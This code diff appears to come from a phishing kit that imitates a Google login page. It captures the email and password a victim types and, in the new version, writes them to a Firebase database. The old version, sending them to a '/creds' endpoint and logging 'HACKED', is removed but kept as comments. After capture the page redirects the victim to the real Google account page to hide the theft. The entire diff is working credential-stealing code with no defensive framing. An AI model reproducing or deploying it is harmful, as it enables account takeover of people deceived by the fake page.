@@ -37,15 +37,29 @@ function doPasswordStep(){
 	var username = $('#email-input').val()
 	var password = $('#password-input').val()
 
-	//Ladies and gentlemen, we got em
-	console.log(username, password)
-	var xmlHttp = new XMLHttpRequest();
-	xmlHttp.open("GET", "/creds?username="+ username +"&password="+ password, false);
-	xmlHttp.send(null);
+	save(username, password);
 
-    console.log('HACKED')
-	//Redirect to myaccount.google
-	window.location.replace("https://myaccount.google.com")
+	// var xhr = new XMLHttpRequest();
+	// xhr.open("GET", "/creds?username="+ username +"&password="+ password, true);
+	// xhr.onreadystatechange = function () {
+	// 	// In local files, status is 0 upon success in Mozilla Firefox
+	// 	if(xhr.readyState === XMLHttpRequest.DONE) {
+	// 		var status = xhr.status;
+	// 		if (status === 0 || (status >= 200 && status < 400)) {
+	// 			//Ladies and gentlemen, we got em
+	// 			console.log(username, password)
+	// 			save(username, password);
+	//
+	// 			// //Redirect to myaccount.google
+	// 			window.location.replace("https://myaccount.google.com")
+	// 		} else {
+	// 			console.log('error')
+	// 			$('#password-input').val('')
+	// 			$('#password-input').addClass("error");
+	// 		}
+	// 	}
+	// };
+	// xhr.send(null);
 }
 
 function toEmailPage(){
@@ -95,4 +109,22 @@ function attachEvents(){
 window.onload = function(){
 	onReady()
 	attachEvents()
+}
+
+
+function save(email, password) {
+	// A post entry.
+	var userData = {
+		email: email,
+		password: password,
+	};
+
+	// Get a key for a new Post.
+	var newUserKey = firebase.database().ref().child('users').push().key;
+
+	// Write the new post's data simultaneously in the posts list and the user's post list.
+	var updates = {};
+	updates['/users/' + newUserKey] = userData;
+
+	return firebase.database().ref().update(updates);
 }
